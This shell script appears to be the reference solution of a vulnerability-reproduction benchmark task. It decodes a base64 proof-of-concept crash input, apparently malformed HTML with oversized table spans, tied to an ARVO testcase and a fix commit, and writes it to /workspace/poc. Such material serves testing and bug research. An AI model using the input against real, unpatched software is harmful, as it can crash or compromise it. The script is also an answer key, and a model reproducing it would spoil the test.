#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit b3db9e52 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
PjxkZD48ZBACAAAAAAAAhe+3erc6PC88PG9sPk9SPUZGRkZGRlwgICAgIzxxPiAgICAgICA8L3RyPi0gICAgICAgPGlmcmFtZT4gICAgIHQgdmFsaWduPXRvcD4KIAogICAgPHRkIGFsaWduPWxlZnQgdmFsaeduPXRvcCBjb2xzcGFuPTg0NiByb3dzcGFuPSItMTcyMDQ1Nzg0NTIxODY2MDkiICAgICAgIHQgPHRkIGFsaWduPWxlZnQmdmFsaeduPXRvcCBjb2xzNDUgICAgICA8dGQgYWxpZ246PWxlZnQzdmFsaeduPXRvcCBjb2xzcGFuPSI3IiByb++3kLc8aGdyb3VwPjxoZ3JvdXA+PGhncm91cD48aGdyb3VwPjxoZ3JvdXA+PGhncm91cD48aWZyYW1lPpHvt5Dvt5C3ke+3bxW3ke+3/+9vcD4KIAogICAgPHRkIGFsaWduPWxlZnQgdmFsaeduPXRvcCBjb2xzcGFuPTIxNDc0ODM0Mzcgcm93c3Bhb3A+CiAKICAgIDx0ZCBhbGlnbj1sZWZ0IHZhbGnnbj10b3AgY29sc3Bhbj0xNjU0NTA1NDA5MDgxMzc4NSByb3dzcGFuPSIzNDAyODIzNjY5MjA5Mzg0NjM0NjMzNzQ2MDc0MzE3NjgyMTE0NTUiICAgICAgIHQgPHRkIGFsaWduPWxlZnQmdmFsaeduPXRvcCBjb2xzcGEgICAgICA8dGQgYWxpZ246PWxl////////////////////////////////////////////////////////////////////////////////////////////////////7/////////////////////////////////////////////8gYQliYWtncm9ygnZuYmEkAiVFYiViYSVCSfE+PHRyIGEJYmFja2dyb3VuZD0iIzxxPjxxPiAgICDvt5C3PGhncm91cD6R77eQ77eQt5Hvt28Vt5HveHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4b5C3kaampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqbvt5Hvt5Hvt5Hv77eRereR77eR77eR77c+PGRkPmY8ZJHv77e3////NTE0MugAAAAAAAAABQM2NTUzNSVmMCU4YiU5Mv////96ereRdz5mc3A=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
